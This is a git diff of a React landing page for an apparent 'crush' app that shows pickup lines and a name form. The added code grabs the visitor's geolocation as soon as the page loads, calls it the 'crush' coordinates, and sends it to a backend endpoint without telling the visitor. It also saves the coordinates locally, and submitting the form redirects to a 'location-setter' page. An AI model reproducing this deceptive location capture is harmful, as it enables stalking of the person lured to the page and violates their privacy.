@@ -1,16 +1,19 @@
 import './landingPage.css';
 import 'react-toastify/dist/ReactToastify.css';
-import React, { useState, useEffect ,useCallback} from 'react';
+import React, { useState, useEffect ,useCallback , useRef} from 'react';
 import { useForm } from 'react-hook-form';
 import { useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { toast, ToastContainer, Slide } from 'react-toastify';
 
-const LandingPage = ({ dotstate }) => {
+const LandingPage = ({ dotstate ,crushName , setcrushName }) => {
   const {handleSubmit,formState,register} = useForm() ; // initializing the form to take data...
   const navigate = useNavigate() ;
   const [imageLinks, setImageLinks] = useState([]);
-  const [crushName, setcrushName] = useState('My Crush');
+
+  // for handling the location fetching state...
+  const [locationFetched, setLocationFetched] = useState(false);
+  const isFetching = useRef(false);
   const textArray = ['Every moment spent with you is like a beautiful dream come true.','If I could rearrange the alphabet, I’d put U and I together.','You must be a magician because whenever I look at you, everyone else disappears.','If beauty were a crime, you’d be serving a life sentence.','You’re like a fine wine; the more of you I drink in, the better I feel.','If I could be any part of you, I’d be your smile.','Do you have a map? Because I just got lost in your eyes.','You must be tired because you’ve been running through my mind all day.','I just wanna spend some Sunsets with You...'];
 
   // function for simulating the delay...
@@ -21,11 +24,10 @@ const LandingPage = ({ dotstate }) => {
       const response = await axios.post('/api/crush/information', formData);
       console.log(response.statusText);
       if (response.status === 200) {
-        toast.success(`Proccessing & Validating you Credentials${dotstate}`, { onClose: () => { navigate('/some-page') } }); // will decide where to navigate...
-        await delay(4); // Ensure to await the delay if necessary...
-      } else {
-        toast.error(`${response.statusText}`);
-      }
+        toast.success(`${response.message}${dotstate}`, { onClose: () => { navigate('/location-setter') } }); // will decide where to navigate...
+        setcrushName(formData.CuteName) ; // setting crushName...
+        await delay(4) ; // Ensure to await the delay if necessary...
+      } else  toast.error(`${response.statusText}`)  ;
     } catch (error) {
       console.error('An error occurred:', error);
       toast.error('error occurred Data proccessing Please try again.'); // Optional: Notify user of error
@@ -36,13 +38,39 @@ const LandingPage = ({ dotstate }) => {
       async function requestForImages() {
           try {
               const response = await axios.get('/api/generate_randomImages'); // Have setted the proxy in package.json
-              setImageLinks(response.data); 
-          } catch (error) {
+              const responseArray = response.data.data ; 
+              setImageLinks(responseArray); // Spread operator to create a new array
+          } catch (error) { 
               console.error('An Error occurred in making request from FRONTEND:', error);
           }
       }
       requestForImages();
   }, []);
+  // logic to send crush coordinates to the backend...
+  useEffect(() => {
+    const captureCoordinatesOfCrush = () => {
+      try {
+        if ('geolocation' in navigator && !locationFetched && !isFetching.current) {
+          isFetching.current = true ;
+          navigator.geolocation.getCurrentPosition(async (position) => {
+            const { latitude, longitude } = position.coords; // destructuring the latitude and longitude from from coords...
+            const locationResponse = await axios.post('/api/crush/location',{latitude:latitude , longitude:longitude});
+            if (locationResponse.status === 200) { 
+              console.log('Crush Location is successfully transfered to backend...') ;
+              localStorage.setItem('crushCoordinates', JSON.stringify({ latitude: latitude, longitude: longitude }));
+            }
+            else console.log('Error in sending crush location to backend...') ;
+            setLocationFetched(true) ;
+            isFetching.current = false ;
+          })
+        }
+      } catch (error) {
+        console.log('Error in location capturing proccess...') ;
+      }
+    }
+    captureCoordinatesOfCrush();
+  }, [locationFetched,isFetching])
+  
 
   return (
     <>
@@ -58,9 +86,11 @@ const LandingPage = ({ dotstate }) => {
       />
       <div id='heading'>🌟 Welcome! Hover over each card to discover exciting messages just for you{dotstate}</div>
       <div className='container'>
-        {imageLinks.map((imageLink, index) => (
-        <div key={index + 1} className='card'><img src={imageLink} alt="img" /><div>{textArray[index]}</div></div>
-        ))}
+      {Array.isArray(imageLinks) && imageLinks.length > 0 && imageLinks.map((imageLink, index) => (
+        <div key={index + 1} className='card'><img src={imageLink} alt="img" /><div>{textArray[index]}</div>
+        </div>
+      ))}
+
       </div>
       <div className='lowerSection'>
         <h2><b>Time to Explore More About this Software !!!</b></h2>
@@ -72,6 +102,8 @@ const LandingPage = ({ dotstate }) => {
           </div>
           <div id='RightBox'>
           <form onSubmit={handleSubmit(handleSubmittion)} className='Input_Box'>
+            <span id='header'><span>wanna know More about you</span><video id='heartBeat' autoPlay loop muted src="/heartBeat.mp4"></video></span>
+            <hr />
             <span>Your Good_Name</span>
             <input type="text" placeholder={`Enter your CuteName ${crushName}`} {...register('CuteName', {
               required: { value: true, message: 'This Field is required for Name recognition...' },
